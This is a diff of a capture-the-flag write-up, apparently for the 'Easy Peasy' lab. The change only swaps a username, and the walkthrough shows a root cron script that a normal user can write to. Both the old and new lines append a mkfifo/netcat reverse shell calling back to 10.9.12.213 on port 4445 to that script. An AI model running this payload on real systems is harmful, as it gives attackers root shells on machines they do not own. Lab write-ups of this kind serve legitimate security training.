@@ -138,7 +138,7 @@ XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 You Have 1 Minute Before AC-130 Starts Firing
 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 !!!!!!!!!!!!!!!!!!I WARN YOU !!!!!!!!!!!!!!!!!!!!
-boring@kral4-PC:~$ 
+--r---@kral4-PC:~$ 
 ```
 So it looks as though we are on a timer. If that is the case, I quickly check for flags.
 
@@ -166,7 +166,7 @@ I also managed to get flag three in a similar manner but just reading the index.
 
 Finally the comments in the Easy Peasy main page - "Then escalate your privileges through a vulnerable cronjob" gave me an idea to review the /etc/crontab file.
 ```
-boring@kral4-PC:~$ cat /etc/crontab
+--r---@kral4-PC:~$ cat /etc/crontab
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
 # command to install the new version when you edit this file
@@ -186,19 +186,19 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 ```
 If we read the file, it tells us that it will actually run as root.
 ```
-boring@kral4-PC:~$ cat /var/www/.mysecretcronjob.sh 
+--r---@kral4-PC:~$ cat /var/www/.mysecretcronjob.sh 
 #!/bin/bash
 # i will run as root
 ```
 In this case if we check the file permissions we see that we can amend the file as a normal user.
 ```
-boring@kral4-PC:~$ ls -la /var/www/.mysecretcronjob.sh 
--rwxr-xr-x 1 boring boring 33 Jun 14 22:43 /var/www/.mysecretcronjob.sh
+--r---@kral4-PC:~$ ls -la /var/www/.mysecretcronjob.sh 
+-rwxr-xr-x 1 --r--- --r--- 33 Jun 14 22:43 /var/www/.mysecretcronjob.sh
 ```
 
 If we now amend (I will append >> in this instance) the file by adding a reverse bash shell:
 ```
-boring@kral4-PC:~$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.12.213 4445 >/tmp/f" >> /var/www/.mysecretcronjob.sh
+--r---@kral4-PC:~$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.12.213 4445 >/tmp/f" >> /var/www/.mysecretcronjob.sh
 ```
 We can check this again with a cat command. Once happy, we set up the netcat on port 4445.
 ```
